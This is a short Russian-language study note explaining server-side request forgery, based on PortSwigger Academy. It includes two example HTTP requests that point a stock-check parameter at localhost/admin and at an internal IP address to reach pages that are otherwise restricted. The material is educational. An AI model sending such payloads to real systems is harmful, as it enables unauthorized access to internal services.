Server-side request forgery - уязвимость, которая позволяет атакующему выполнять запросы от серверной части приложения к непреднамеренному расположению (например, к внутреннему сервису организации или к домену, который контролирует атакующий)
## Источники информации
- [SSRF Topic PortSwigger Academy](https://portswigger.net/web-security/ssrf)
## SSRF-атака на сервер
- Атакующий выполняет запрос от сервера к самому себе (loopback interface: `localhost`, `127.0.0.1`), это может позволить атакующему получить доступ к страницам без необходимых прав. Например, подставив URL-адрес страницы `http://localhost/admin` в HTTP-запрос, который ожидает URL в качестве параметра, злоумышленник может получить к ней доступ:
```HTTP
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118 

stockApi=http://localhost/admin
```
## SSRF-атака на внутренние бэкенд системы
- Атакующий, отправив запрос с сервера, может получить доступ к другим системам во внутренней сети:
```HTTP
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118 

stockApi=http://192.168.0.68/admin  
```
## Инструменты
- Burp Suite Collaborator (запросы ко внешним сайтам)